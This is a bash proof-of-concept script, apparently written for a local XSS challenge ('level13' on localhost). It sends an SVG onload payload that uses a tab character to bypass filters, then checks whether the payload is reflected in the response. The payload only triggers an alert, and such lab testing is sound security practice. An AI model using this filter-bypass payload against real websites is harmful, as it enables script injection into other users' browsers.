#!/bin/bash
# XSS Bypass PoC: Using SVG with onload event
# Target: http://localhost:5000/level13
# Bypass Technique: SVG element + onload event

TARGET="http://localhost:5000/level13"
PAYLOAD=">%3Csvg%09onload=alert%28%22XSS%22%29%3E"

echo "[*] Testing XSS bypass with SVG onload event"
echo "[*] Target: $TARGET"
echo "[*] Payload: ><svg[TAB]onload=alert(\"XSS\")>"
echo ""

RESPONSE=$(curl -s "$TARGET?name=$PAYLOAD")

if echo "$RESPONSE" | grep -q '<svg.*onload=alert'; then
    echo "[+] SUCCESS: SVG payload reflected in HTML"
    echo "[+] SVG onload event handler bypassed all filters"
    echo "[+] Payload executes automatically when SVG loads"
    exit 0
else
    echo "[-] FAILED: SVG payload not found"
    exit 1
fi
